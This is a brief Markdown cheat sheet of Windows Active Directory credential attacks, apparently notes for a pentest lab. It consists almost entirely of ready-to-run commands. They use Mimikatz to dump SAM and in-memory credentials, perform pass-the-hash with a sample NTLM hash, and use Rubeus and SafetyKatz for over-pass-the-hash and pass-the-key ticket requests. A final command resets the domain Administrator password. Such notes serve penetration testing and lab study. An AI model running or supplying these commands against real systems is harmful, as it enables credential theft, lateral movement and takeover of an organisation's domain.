# Hashes

## Dump Hashes

### **1st way**

#### **Dump Hashes from Sam file**

```powershell
Invoke-Mimikatz -command '"privilege::debug" "token::elevate" "lsadump::sam""exit"'
```

### **2nd way**

#### **dump MSV credentials from memory**

```powershell
Invoke-Mimikatz -command '"privilege::debug" "token::elevate" "sekurlsa::msv""exit"'
```

***

## Pass-the-Hash

Uses the NTLM hash directly to authenticate without knowing the real password.

for NTLM Hash

```powershell
sekurlsa::pth /user:**Administrator** /ntlm:a102ad5753f4c441e3af31c97fad86fd /domain:pdc /run:powershell.exe
# replace with target user
```

***

## Over Pass The Hash

Uses the NTLM hash to request a **Kerberos TGT**, then uses the TGT to authenticate anywhere in the domain.

```powershell
Rubeus.exe asktgt /user:SHALBY /rc4:5D88C6E440C1B976A9C1A2EF6AD66083  /ptt

# machine user

Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:us.techcorp.local /aes256:<aes256key> /run:powershell.exe"'

SafetyKatz.exe "sekurlsa::pth /user:administrator /domain:us.techcorp.local /aes256:<aes256keys>  /run:cmd.exe" "exit"

Rubeus.exe asktgt /user:administrator /aes256:<aes256keys> /opsec /createnetonly:C:\\Windows\\System32\\cmd.exe /show /ptt
```

***

## Pass-the-Key

**Pass-the-Key (PtK)** uses **Kerberos keys** (AES/DES keys from tickets) instead of passwords or NTLM hashes to authenticate to services.

```powershell
sekurlsa::pth /user:Administrator /domain:us.techcorp.local /aes256:<aes256 krbtgt hash> /run:powershell.exe

SafetyKatz.exe "sekurlsa::pth /user:administrator /domain:us.techcorp.local /aes256:<aes256 krbtgt hash> /run:cmd.exe" “exit”
```

```powershell
net user Administrator "test@123" /dom
```
